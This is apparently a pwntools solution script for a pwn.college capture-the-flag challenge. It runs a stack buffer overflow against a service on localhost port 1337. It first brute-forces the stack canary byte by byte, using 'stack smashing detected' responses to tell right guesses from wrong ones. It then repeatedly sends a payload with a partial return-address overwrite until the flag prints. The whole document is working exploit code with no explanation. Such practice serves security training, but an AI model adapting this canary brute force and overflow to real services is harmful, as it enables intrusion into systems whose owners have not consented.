from pwn import *

canary = bytearray()
#canary = bytearray(b'\x00\x94\xda\xea\xd7\x88 \xf8')

while len(canary) < 8:
    for c in range(256):
        r = remote('localhost',1337)

        r.recvuntil('Payload size:')
        length = 72 + len(canary) + 1
        print(f"Canary len so far {len(canary)} and total length of payload {str(length)}")
        r.sendline(str(length).encode())

        payload =  b'a' * 72 + canary
        
        force = payload + bytes([c]) 
        print('force:',force)
        r.send(force)
        s = r.recvall(1)
        if s.find(b'stack smashing detected') == -1:
            canary.append(c)
            print(canary)
            break

print(f"Canary after brute forcing: {canary}")


while True:
    r = remote('localhost',1337)
    
    r.recvuntil('Payload size:')
    r.sendline(b'90')

    payload = b'a' * 72  + canary + b'a' * 8 + p16(0x3d1a)
    
    r.recvuntil('Send your payload')
    r.send(payload)

    #p.interactive()
    s = r.recvall(timeout = 2)
    #print(s)
    if s.find(b'pwn.college{') != -1:
        print(s)
        break
